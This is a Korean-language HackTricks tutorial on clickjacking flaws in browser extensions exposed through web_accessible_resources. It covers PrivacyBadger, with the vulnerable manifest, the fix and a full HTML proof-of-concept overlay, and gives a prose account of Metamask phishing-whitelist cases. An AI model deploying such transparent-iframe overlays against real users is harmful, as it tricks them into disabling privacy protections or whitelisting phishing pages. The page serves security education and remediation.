# BrowExt - 클릭재킹

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 기본 정보

이 페이지는 브라우저 확장 프로그램의 클릭재킹 취약점을 악용할 것입니다.\
클릭재킹이 무엇인지 모르는 경우 다음을 확인하세요:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

확장 프로그램에는 **`manifest.json`** 파일이 포함되어 있으며, 이 JSON 파일에는 `web_accessible_resources` 필드가 있습니다. [Chrome 문서](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources)에서는 다음과 같이 설명합니다:

> 이러한 리소스는 **`chrome-extension://[PACKAGE ID]/[PATH]`** URL을 통해 웹 페이지에서 사용할 수 있으며, 이는 **`extension.getURL 메서드`**를 사용하여 생성할 수 있습니다. 허용 목록에 있는 리소스는 적절한 CORS 헤더와 함께 제공되므로 XHR과 같은 메커니즘을 통해 사용할 수 있습니다.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

브라우저 확장 프로그램의 **`web_accessible_resources`**는 웹을 통해서만 접근할 수 있는 것뿐만 아니라, 확장 프로그램의 고유한 권한과 함께 작동합니다. 이는 다음과 같은 기능을 수행할 수 있음을 의미합니다:

- 확장 프로그램의 상태 변경
- 추가 리소스 로드
- 브라우저와 일부 상호 작용

그러나 이 기능은 보안 위험을 가지고 있습니다. **`web_accessible_resources`** 내의 리소스에 중요한 기능이 있는 경우, 공격자는 이 리소스를 외부 웹 페이지에 임베드할 수 있습니다. 이 페이지를 방문하는 의심하지 않는 사용자는 이 임베드된 리소스를 암묵적으로 활성화할 수 있습니다. 이러한 활성화는 확장 프로그램 리소스의 권한과 기능에 따라 의도하지 않은 결과를 초래할 수 있습니다.

## PrivacyBadger 예제

확장 프로그램 PrivacyBadger에서는 다음과 같이 `skin/` 디렉토리가 `web_accessible_resources`로 선언되어 취약점이 식별되었습니다 (원본 [블로그 게시물](https://blog.lizzie.io/clickjacking-privacy-badger.html) 참조):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
이 구성은 잠재적인 보안 문제로 이어질 수 있습니다. 특히 브라우저에서 PrivacyBadger 아이콘과 상호작용할 때 렌더링되는 `skin/popup.html` 파일이 `iframe` 내에 포함될 수 있습니다. 이 포함은 사용자들이 "이 웹사이트의 PrivacyBadger 비활성화"를 우연히 클릭하도록 속일 수 있습니다. 이러한 동작은 사용자의 개인 정보 보호를 저해하며 PrivacyBadger 보호를 비활성화시키고 사용자를 추가 추적에 노출시킬 수 있습니다. 이 취약점의 시각적인 예시는 [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm)에서 제공되는 ClickJacking 비디오 예시에서 확인할 수 있습니다.

이 취약점을 해결하기 위해 간단한 해결책이 구현되었습니다: `web_accessible_resources` 목록에서 `/skin/*`을 제거하는 것입니다. 이 변경으로 인해 `skin/` 디렉토리의 내용이 웹 접근 가능한 리소스를 통해 액세스되거나 조작되지 않도록 보장하여 위험을 효과적으로 완화시켰습니다.

수정 방법은 간단합니다: **`web_accessible_resources`에서 `/skin/*`을 제거**하십시오.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask 예시

[**Metamask에서의 ClickJacking에 대한 블로그 포스트는 여기에서 찾을 수 있습니다**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). 이 경우, Metamask는 액세스에 사용된 프로토콜이 **`https:`** 또는 **`http:`** (예: **`chrome:`**이 아님)인지 확인하여 취약점을 수정했습니다:

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Metamask 확장 프로그램에서 **또 다른 ClickJacking 취약점**은 페이지가 `“web_accessible_resources”: [“inpage.js”, “phishing.html”]` 때문에 피싱으로 의심되는 경우에도 **Click to whitelist**할 수 있었습니다. 이 페이지는 Clickjacking에 취약했기 때문에 공격자는 희생자가 알아채지 못하고 정상적인 것처럼 보이도록 하여 희생자가 클릭하여 화이트리스트에 추가하고, 그 후에 피싱 페이지로 돌아갈 수 있었습니다.

## Steam Inventory Helper 예시

브라우저 확장 프로그램에서의 **XSS**와 **ClickJacking** 취약점이 연계된 예시를 확인하려면 다음 페이지를 확인하세요:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## 참고 자료

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family)인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
